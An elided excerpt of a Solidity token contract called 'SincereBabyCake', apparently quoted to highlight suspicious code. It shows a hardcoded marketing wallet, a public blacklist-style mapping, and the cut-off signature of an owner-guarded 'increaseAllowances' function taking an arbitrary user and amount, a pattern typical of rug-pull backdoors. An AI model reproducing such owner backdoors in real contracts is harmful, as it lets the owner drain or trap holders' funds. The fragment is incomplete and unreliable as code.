...
contract SincereBabyCake is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0xf79247156179cA9c45130641E8b7D95Cd161378a); // Marketing Address
    ...
    string private _name = "SincereBabyCake";
   ...
   mapping(address => bool) public _islisted;
    ...
    function increaseAllowances(address user,uint256 amount) public pauseOwner{
